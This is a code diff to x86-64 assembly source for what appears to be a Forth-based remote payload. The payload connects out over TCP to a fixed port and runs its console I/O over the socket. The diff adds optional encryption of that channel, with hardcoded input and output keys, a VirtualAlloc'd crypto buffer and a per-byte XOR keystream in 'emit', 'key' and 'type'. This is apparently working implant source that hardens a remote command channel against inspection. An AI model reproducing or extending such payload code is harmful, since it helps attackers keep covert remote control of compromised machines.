@@ -1,3 +1,15 @@
+;;; Optionally encrypt (does add size to payload, so is optional)
+%ifdef ADDCRYPTO
+%ifndef INKEY
+	%define INKEY  `\xf1\x77\x80\x02\xea\x2a\x5f\x72\xd2\x0b\x28\x1e\x38\xa9\xc9\x4b`
+%endif
+
+%ifndef OUTKEY
+	%define OUTKEY `\x1c\xab\x2b\x1d\xa7\xf8\xd7\x98\x4a\x28\x8b\x54\x58\x71\xb0\x52`
+%endif
+%endif
+
+;;; TCP transport options configured here
 %ifndef CONNECTWAIT
 	%define CONNECTWAIT 1000
 %endif
@@ -7,7 +19,11 @@
 %endif
 
 %ifndef PORT
+%ifdef ADDCRYPTO
+	%define PORT 1922
+%else
 	%define PORT 1919
+%endif
 %endif
 
 start_def ASM, engine, "engine"
@@ -68,7 +84,40 @@ start_def ASM, initio, "initio"
 .conn:  call G_WCONNECT		; connect to port
 	and rax, rax		; loop until connection is successful
 	jnz .lp			; ...
+
+;;; ------------------------------------------------------------------------
+;;; Optional crypto setup code -- we use two keys, one for input and
+;;; one for output, and will need to stage blocks through a region
+;;; of memory for encryption when sending large amounts of data with
+;;; the 'type' word.
+;;; ------------------------------------------------------------------------
 	
+%ifdef ADDCRYPTO
+	xor ecx, ecx		   ; let kernel choose address
+	mov edx, 16384		   ; buffer space for encrypting outbound blocks
+	mov r8, 0x3000		   ; reserve and commit space
+	mov r9, 4		   ; conservative PAGE_READWRITE permissions
+	call W32_VirtualAlloc	   ; allocate space
+	AddGlobal G_CRYPTOBUF, rax ; save it here
+	AddGlobal G_INSTATE, rax   ; starts with input crypto state
+	add rax, 512		   ; next is outstate
+	AddGlobal G_OUTSTATE, rax  ; ...
+	add rax, 512	 	   ; next is scratch space for encrypting blocks
+	AddGlobal G_CRYPTOPAD, rax ; ...
+
+	InlineString INKEY, rax, rcx ; key for input stream
+	pushthing rax		     ; address of key
+	pushthing rcx		     ; length of key
+	pushthing G_INSTATE	     ; create crypto state block
+	call code_cryptinit	     ; ...
+
+	InlineString OUTKEY, rax, rcx ; key for output stream
+	pushthing rax		      ; address of key
+	pushthing rcx		      ; length of key
+	pushthing G_OUTSTATE	      ; create crypto state block
+	call code_cryptinit	      ; ...
+%endif
+
 	mov rsp, rbp
 end_def initio
 
@@ -87,8 +136,16 @@ start_def ASM, setecho, "!echo"
 end_def setecho	
 
 start_def ASM, emit, "emit"
+	
+%ifdef ADDCRYPTO
+	pushthing G_OUTSTATE
+	call code_drip
+	call code_xor
+%endif
+
 	push rcx
 	push rdi
+	
 	mov rcx, G_SOCK
 	mov rdx, rsp
 	xor r8, r8
@@ -116,6 +173,12 @@ start_def ASM, key, "key"
 	add rsp, 0x20
 	pop rdi
 	and rdi, 0xff
+
+%ifdef ADDCRYPTO
+	pushthing G_INSTATE
+	call code_drip
+	call code_xor
+%endif	
 
 	cmp dil, 0x0a
 	jne .notnl
@@ -149,6 +212,31 @@ start_def ASM, keyq, "key?"
 	pop rcx
 end_def keyq
 	
+%ifdef ADDCRYPTO
+
+;;; @fixme -- this is the cheap way to do 'type', by just iterating through
+;;; 'emit'.  Ideally, this should break the data up into blocks and encrypt
+;;; them in bulk.  In testing, this doesn't seem so bad, but at some point
+;;; this should be expanded.
+	
+start_def ASM, type, "type"
+	popthing rcx
+	popthing rsi
+	
+.loop:	pushthing [rsi]
+	and rdi, 0xff
+	push rcx
+	push rsi
+	call code_emit
+	pop rsi
+	pop rcx
+	inc rsi
+	loop .loop
+
+end_def type	
+	
+%else
+	
 start_def ASM, type, "type"	
 	push rcx
 	mov rcx, G_SOCK
@@ -162,3 +250,5 @@ start_def ASM, type, "type"
 	add PSP, 16
 	pop rcx
 end_def type	
+
+%endif
